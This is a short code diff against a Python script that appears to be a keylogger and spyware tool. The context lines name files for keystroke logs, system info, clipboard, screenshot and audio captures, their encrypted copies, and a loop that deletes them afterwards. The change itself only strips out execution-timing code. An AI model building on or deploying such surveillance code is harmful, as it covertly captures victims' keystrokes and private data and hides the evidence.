@@ -30,7 +30,6 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 import subprocess
 
-script_starts = time.time()
 # UN-ENCRYPTED DATA
 keys_data = "keylog.txt"
 system_data = "system_info.txt"
@@ -265,6 +264,3 @@ deleting_files = [system_data, keys_data, clipboard_data, screenshot_data, audio
                   system_data_encrypted, clipboard_data_encrypted]
 for file in deleting_files:
     os.remove(file_path_appended + file)
-script_ends = time.time()
-total_execution_time = script_ends - script_starts
-print("Total Execution Time = ", script_ends - script_starts)
